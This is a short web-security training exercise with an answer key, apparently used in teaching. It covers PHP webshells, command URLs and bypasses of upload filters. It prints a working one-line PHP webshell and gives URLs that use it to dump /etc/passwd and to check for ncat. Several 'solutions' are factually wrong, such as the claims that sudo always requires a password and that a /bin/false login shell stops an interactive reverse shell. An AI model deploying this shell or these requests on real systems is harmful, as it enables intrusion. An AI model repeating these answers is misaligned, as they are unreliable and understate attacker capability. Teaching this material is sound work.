# Webshell Warm-Up
In this exercise, you'll review fundamental concepts around webshells.

## Constructing Commands
Suppose the following PHP webshell lives at `https://vulnerable.site/shell.php`.

  ```php
  <?php
    echo system($_GET["command"]);
  ?>
  ```

How would you construct a URL to:
- Dump `/etc/passwd`?
- Determine if `ncat` is installed?
- List all files in the current directorty?
> **Solutions**
>  - `https://vulnerable.site/shell.php?command=cat%20/etc/passwd`
>  - `https://vulnerable.site/shell.php?command=ncat%20--version`
>  - `https://vulnerable.site/shell.php?command=ls`

## Bypassing Filters
Suppose the web application you're assessing has a photo upload feature.
- State one technique for preventing users from uploading webshells.
  > **Solution**: You could use a whitelist of allowed file types (i.e., only allow PNG, JPG/JPEG, etc.). Alternatively, you could use a blacklist of disallowed file types (i.e., don't allow PHP, Python, etc.)
- Is there any way to bypass your suggested fix? Why or why not?
  > **Solution**: Blacklists can be bypassed by simply changing the file extension. Whitelists may be more robust to this bypass, as the web application can be configured to handle files of each allowed type in a specifically, secure way.

## Thinking Critically
- Can you use a webshell to run commands with `sudo`? Why or why not?
  > **Solution**: No, because `sudo` requires users to enter a password.
- Can you use a webshell to add or modify a user, or change group membership? Why or why not?
  > **Solution**: No, because adding/modifying users requires `sudo`.
- Can you use a webshell to open an interactive shell to an attacking machine? Why or why not?
  > **Solution**: Maybe. In the examples we've seen, no, because the server runs as the `www-data` user, which has a default shell of `/bin/false` or /bin/nologin`, both of which prevent the user from acquiring an interactive shell.
